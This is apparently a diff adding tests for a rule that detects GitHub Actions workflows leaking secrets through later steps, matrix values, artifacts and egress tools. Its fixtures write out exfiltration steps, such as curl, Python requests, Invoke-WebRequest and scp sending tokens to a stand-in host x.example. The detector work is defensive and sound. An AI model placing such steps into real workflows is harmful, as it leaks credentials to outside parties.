@@ -390,6 +390,88 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: false positives", () => {
   });
 });
 
+describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: flow between steps and other egress tools", () => {
+  it("fires when a step exports the secret to $GITHUB_ENV and a later step curls it out", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      '      - run: echo "TOKEN=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_ENV"',
+      "      - run: echo building",
+      '      - run: curl -d "$TOKEN" https://x.example/i',
+    ]);
+    expect(hits()).toEqual([9]);
+  });
+
+  it("fires when a step writes the secret to a file and a later step uploads an artifact", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      '      - run: echo "${{ secrets.SIGNING_KEY }}" > key.txt && tar czf out.tgz key.txt',
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: out.tgz",
+    ]);
+    expect(hits()).toEqual([8]);
+  });
+
+  it("fires for a secret placed in a matrix value", () => {
+    workflow([
+      ...HEAD,
+      "    strategy:",
+      "      matrix:",
+      '        token: ["${{ secrets.A_TOKEN }}"]',
+      "    steps:",
+      '      - run: curl -d "${{ matrix.token }}" https://x.example/i',
+    ]);
+    expect(hits()).toEqual([10]);
+  });
+
+  it("fires for Python requests, PowerShell Invoke-WebRequest and scp to a remote host", () => {
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      T: ${{ secrets.NPM_TOKEN }}",
+      "    steps:",
+      `      - run: python -c "import requests; requests.post('https://x.example', data='$T')"`,
+      "      - run: Invoke-WebRequest -Uri https://x.example -Body $env:T",
+      "      - run: scp o.txt user@x.example:/tmp/",
+    ]);
+    expect(hits()).toEqual([9, 10, 11]);
+  });
+
+  it("does not carry the secret past a step that only discards output, or into another job", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - run: npm publish > /dev/null 2>&1",
+      "        env:",
+      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
+      "      - run: curl -fsS https://x.example/health",
+      "  other:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      '      - run: echo "T=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_ENV"',
+      "  third:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - run: curl -fsS https://x.example/health",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
+  it("does not fire for a local rsync or for gh api with a stored token", () => {
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      T: ${{ secrets.NPM_TOKEN }}",
+      "    steps:",
+      "      - run: rsync -a dist/ out/",
+      "      - run: gh api repos/o/r/releases",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+});
+
 describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
   const FIVE_MIB = 5 * 1024 * 1024;
 
